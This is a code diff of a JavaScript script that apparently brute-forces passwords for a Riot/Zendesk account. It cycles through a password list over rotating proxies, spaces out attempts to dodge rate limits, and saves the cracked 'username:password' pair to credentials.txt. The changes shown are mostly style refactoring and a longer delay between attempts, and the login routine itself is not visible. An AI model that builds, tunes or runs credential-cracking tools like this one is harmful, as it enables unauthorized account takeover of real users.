@@ -1,3 +1,4 @@
+/* eslint-disable no-unused-vars */
 import { Zendesk } from './riot/Zendesk.js';
 import { HttpsProxyAgent } from 'https-proxy-agent';
 import * as fs from 'fs';
@@ -30,7 +31,7 @@ const proxies = readLines(config.proxy_list_path);
 let found = false;
 let foundPassword = '';
 
-const saveCredentialsAndExit = () => {
+function saveCredentialsAndExit() {
   try {
     fs.writeFileSync('./credentials.txt', `${USERNAME}:${foundPassword}`, {
       encoding: 'utf-8',
@@ -40,13 +41,13 @@ const saveCredentialsAndExit = () => {
     logger.error('Could not write password to file.');
   }
   process.exit(0);
-};
+}
 
-const checkFound = () => {
+function checkFound() {
   if (found) saveCredentialsAndExit();
-};
+}
 
-const doWork = async (password) => {
+async function doWork(password) {
   for (;;) {
     checkFound();
 
@@ -100,9 +101,9 @@ const doWork = async (password) => {
     }
     break;
   }
-};
+}
 
-const start = async () => {
+async function start() {
   for (const password of passwords) {
     checkFound();
 
@@ -111,8 +112,8 @@ const start = async () => {
     if (password.length < 8) continue;
 
     doWork(password);
-    await sleep(500); // if you have thousands of proxies you might not even need this
+    await sleep(2000); // if you have thousands of proxies you might not even need this
   }
-};
+}
 
 start();
